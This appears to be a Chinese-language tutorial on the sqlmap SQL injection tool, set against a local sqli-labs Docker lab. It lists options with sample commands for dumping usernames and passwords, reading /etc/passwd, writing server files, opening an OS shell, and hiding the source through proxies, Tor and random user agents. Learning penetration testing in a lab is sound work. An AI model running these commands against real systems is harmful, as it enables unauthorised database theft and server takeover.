[[toc]]

## 简介
1. sqlmap是一款集成多种数据库识别及注入方式的工具；
2. 可在任何平台上使用，支持Python2.6、2.7、3.x；
3. 集成了大量的payload；
4. 强大的检测与利用自动化处理能力。
## 下载安装
1. 官网
	- https://sqlmap.org/
2. GitHub
	- https://github.com/sqlmapproject/sqlmap
3. 用法
	- https://github.com/sqlmapproject/sqlmap/wiki/Usage

## 功能
1. DBMS支持（N种）
	- MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, MemSQL, TiDB, CockroachDB, HSQLDB, H2, MonetDB, Apache Derby, Amazon Redshift, Vertica, Mckoi, Presto, Altibase, MimerSQL, CrateDB, Greenplum, Drizzle, Apache Ignite, Cubrid, InterSystems Cache, IRIS, eXtremeDB, FrontBase, Raima Database Manager, YugabyteDB and Virtuoso
1. 注入攻击方式（6种）
	- （1）boolean-based blind	布尔类型的盲注
	- （2）time-based blind 	时间盲注
	- （3）error-based	错误注入
	- （4）UNION query-based union	联合查询
	- （5）stacked queries	堆叠注入
	- （6）out-of-band	带外注入
1. 直连数据库支持
	- 只需提供DBMS的账户信息、IP、端口、数据库名称，不需要通过SQL注入
1. 枚举功能支持
	- 枚举用户、密码HASH、权限、角色、数据库、数据表、数据列
1. 密码HASH相关支持（一定程度）
	- 能够一定程度识别HASH格式以及自动实施基于字典的破解攻击
1. 对DUMP数据功能支持
	- 可以对数据库数据导出
1. 搜索功能强大支持（非常实用）
	- 可用于搜索特定的数据库名，所有数据库中特定的表名，列名
1. 上传下载文件支持
	- 支持从数据库服务器下载和上传任意文件，有效支持的数据库：MySQL、PostgreSQL、Microsoft SQL Server
1. 命令行执行支持
	- 支持在数据库服务器上执行任意命令并检索其标准输出，有效支持的数据库：MySQL、PostgreSQL、Microsoft SQL Server
1. 基于OOB的tcp连接支持
1. 数据库提权支持

## 选项实例
1. 选项-v
	- 0：只显示python的error和critical级别的信息
	- 1：显示information和warning级别的信息
	- 2：显示debug级别的信息
	- 3：额外显示注入的payload(很有用，测试过程的记录)
	- 4：额外显示HTTP请求内容
	- 5：额外显示HTTP响应头
	- 6：额外显示HTTP响应页面内容
1. 选项-d
	- 通过sqlmap直接连接一个数据库实例，该选项接收一个连接字符串作为参数
	- DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME(MySQL,Oracle,Microsoft SQL Server, PostgreSQL,etc.)
	- DBMS://DATABASE_FILEPATH(SOLite,Microsoft Access,Firebird.etc.)
	- python36 sqlmap.py -d "mysql://root:123456@10.1.1.1:3306/test"
1. 选项-u或--url
	- 选定一个url目标，并执行SQL注入攻击示例:
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1/?id=1"
1. 选项-m 
	- 批量执行url目标（推荐）
	- python36 sqlmap.py -m ./data/txt/urls.txt
1. 选项--batch
	- 在sqlmap执行时没有任何用户交互，强制运行
	- python sqlmap.py -u "http://10.8.250.77:8082/Less-1/?id=1" --batch
1. 选项-f fingerprint
	- 数据库管理系统指纹识别
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1/?id=1" -f
1. 选项--banner 
	- 数据库banner信息，执行更广泛的数据库管理系统指纹识别（推荐）
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1/?id=1" --banner
1. 选项-d或--data
	- 默认的HTTP请求发送方式是GET，可以通过该选项指定为POST
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1" --data="id=1" -f --banner --dbs --users
1. 选项--method
	- 指定请求方法，通常Sqlmap能自动判断出是使用GET方法还是POST方法，但在某些情况下需要的可能是PUT等很少见的方法，此时就需要用参数“--method”来指定方法
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1" --method=PUT
1. 选项--cookie(就够用了),--cookie-del（指定分隔符）,--load-cookies
	- 意义：没有登录场景下，无法看到更多的信息
	- 说明:在sqlmap执行注入攻击的过程中，如果浏览器返回了Set-Cookie的headers，那么sqlmap会自动识别这一指令，并更新对应的Cookie，如果我们已经通过-cookie设定了Cookie的数值，那么sqlmap会向我们确认是否进行更新
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1" --cookie 'cookie#cookie2' --cookie-del "#"
1. 选项--user-agent或--random-agent
	- 意义：服务端很容易发现，需要伪装
	- 默认情况下，sqlmap发送的HTTP请求中User-Agent值:sqlmap/1.0-dev-xxxxxxx(http://sqlmap.org)
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1" --user-agent "ua"
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1" --random-agent(推荐用法)
1. 选项 --proxy（内网环境或者网络不可达环境）,--proxy-file (指定一个存储着代理列表的文件)
	- 在实战场景下非常重要，允许sqlmap的请求都通过我们设置的proxy进行发送，无论是出于隐藏自身IP地址的目的，还是绕过IP限制，都非常实用
	- 例如使用参数“--proxy”来设置一个HTTP(S)代理，格式是“http(s)://url:port”。若代理需要认证，使用参数“--proxy-cred”来提供认证凭证，格式是“username:password”
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1" --proxy=(http|https|socks4|socks5)://address:port --proxy-cred=username:password
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1" --proxy-file ./data/txt/proxys.txt
1. 选项--tor,--tor-port,--tor-type 以及--check-tor
	- 通过配置Tor Client以及Privoxy我们就可以启用-tor选项
	- 该选项可以使得sqlmap的请求通过Tor网络进行发送，以达到匿名的目的。
	- 同时，我们还可以通过--tor-port 以及--tor-type 设置所使用的的 Tor Proxy 类型
	- check-tor 则是用来检测 Tor 网络是否配置目连接正常
1. 选项--crawl
	- 从目标位置开始收集（爬虫）可能易受攻击的链接
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1?id=1" --crawl=10 --batch
1. 选项--threads
	- 最大并发HTTP(S)请求数
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1" --threads=6 --batch
	- import multiprocessing
	- multiprocessing.cpu_count() #获取系统逻辑CPU个数
1. 选项--risk=1-3，--level=1-5 默认都是1
	- level级别升高，会加更多的payload用于测试，level=2会加cookie的测试，level=3会加Useragent的注入测试检测，level=5会加host注入点测试
	- risk是一个比较危险的选项，级别升高会加or和Update，可能对数据库表内容进行修改。往往不是我们所期望的，所以谨慎使用。
	- 如果不输入?id=1 sqlmap 自动指定参数，可以观察到大量 payload，而 risk 1 level 1会直接退出
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1" --risk=3 --batch
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1" --level=3 --batch
1. 选项--privileges（检测当前用户授权） --is-dba（判断当前执行查询的用户是否是DBA）
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1?id=1" --privileges --batch
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1?id=1" --is-dba --batch
1. 选项--file-read（从服务器端读取文件保存本地） --file-write（本地文件路径）  --file-dest（服务器文件路径）
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1?id=1" --file-read "/etc/passwd" --batch
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1?id=1" --file-write "./data/txt/pikachu.txt" --file-dest "/tmp/pikachu.txt" --batch	
1. 选项--os-cmd,--os-shell（功能强大，使用限制高）
	- 需要具有文件夹写权限(root 更好)
	- #网站的路径，里面提供部分默认选项，需要保证路径匹配	
	- #PHP 主动转义的功能关闭(magic_quotes_gpc)
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1?id=1" --os-shell --batch
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1?id=1" --os-cmd='ll' --batch
	
## 实战场景
1. 获取当前用户下所有数据库
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1/?id=1" -dbs 
2. 获取当前数据库
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1/?id=1" --current-db
3. 获取数据库的表名
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1/?id=1" -D "security" -tables
4. 获取表中的字段
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1/?id=1" -D "security" -tables -T "users" --columns
5. 获取字段的内容
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1/?id=1" -D "security" -tables -T "users" -C "password,username" --dump
6. 下载数据库的内容
	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1/?id=1" -D "security" -tables -T "users" -C "id,password,username" --dump-all
	 
## 相关说明
1. 密码爆破
	- 在显示表的情况下，使用了默认密码字典进行 Hash 转换，如果默认的密码字典不足到网上有专门的 md5 彩虹表碰撞网站。
	- agdlksagjlkagj:admin
	- agdlksagjlkagj:admin11
	- agdlksagjlkagj:admin234
1. sql日志记录
	- sqlmap有自己的日志和记录，存储扫描结果，如果发现扫描结果可以从记录中获取，就不会再重复扫描
	- 如果需要重新扫描，需要清空扫描结果
	- 扫描结果存储位置：.sqlmap目录
1. sqlmap之payload
	- sql-master/data/xml/payloads 目录下有 payload。
## 靶场环境
1. sqli-labs
```
docker search sqli-labs (看星星最多的镜像)
docker pull acgpiano/sqli-labs
docker run -dt --name sqli-labs -p 8082:80 --rm acgpiano/sqli-labs
访问：http://10.8.250.77:8082
```
1. mysql
```
docker search mysql
docker pull mysql
docker run -d --restart=always --name=mysql -v /var/lib/mysql:/var/lib/mysql -v /etc/mysql:/etc/mysql -v /var/log/mysql:/var/log/mysql -p 3306:3306 -e TZ=Asia/Shanghai -e MYSQL_ROOT_PASSWORD=123456 mysql:latest --character-set-server=utf8mb4 --collation-server=utf8mb4_general_ci
docker ps --format "table {{.Names}}"
```
## 测试
python36 sqlmap.py --random-agent  -m ./data/txt/urls.txt  -v 3 --batch --banner --level 5 --risk 3 --crawl 5 --threads=8






